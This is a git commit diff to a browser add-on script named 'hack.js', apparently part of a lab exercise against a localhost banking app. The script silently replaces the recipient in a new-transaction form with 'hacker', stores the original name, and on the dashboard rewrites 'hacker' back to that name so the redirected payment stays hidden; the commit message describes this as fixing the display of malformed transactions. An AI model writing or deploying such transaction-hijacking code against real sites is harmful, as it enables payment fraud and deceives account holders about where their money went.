f9a516d806441b858e9406c50f04097900908b18
Paweł Wilkosz <pwilkosz5@gmail.com>
2019-11-24 21:53:55 +0100

    Fix display of malformed transactions

--- bank/hackaddon/hack.js
+++ bank/hackaddon/hack.js
@@ -1,14 +1,13 @@
-let victimName = "";
 if (window.location == "http://localhost:8000/new_transaction" && document.querySelector("a.btn")) {
   const input = document.querySelector(".container > form:nth-child(4) > input:nth-child(2)")
-  victimName = input.value
+  window.localStorage.setItem('victimName', input.value)
   input.value = "hacker"
 
 } else if (window.location == "http://localhost:8000/dashboard") {
   const recipients = document.querySelectorAll(".table > tbody:nth-child(2) > tr > td:nth-child(2)")
   for (field of recipients) {
     if (field.innerText == "hacker") {
-      field.innerText = ""
+      field.innerText = window.localStorage.getItem('victimName') || ""
     }
   }
 }
